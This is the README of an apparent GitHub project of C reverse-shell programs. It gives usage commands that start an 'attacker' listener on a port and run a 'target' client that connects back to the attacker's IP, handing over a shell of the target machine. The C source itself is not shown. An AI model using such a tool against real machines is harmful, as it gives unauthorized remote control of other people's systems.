# reverseShell
Scripts of C which after compiling can be used by an 
**Attacker** 
to gain a shell of
**Target** 
machine.

## Usage
### 1. Setup a server and listen for incoming connections.
On your machine setup a server and start listening on a port.

``` 
./attacker 8080 
```

### 2. Execute client script and setup a connection to the server
You can do this by simply executing the target compiled file

```
./target 192.168.0.2 8080
```

Now you should have a prompt on server machine.

## Demo
![Alt Text](https://github.com/Yashvendra/reverseShell/blob/master/Demo/video-gif.gif)

## License
MIT © y_k_007

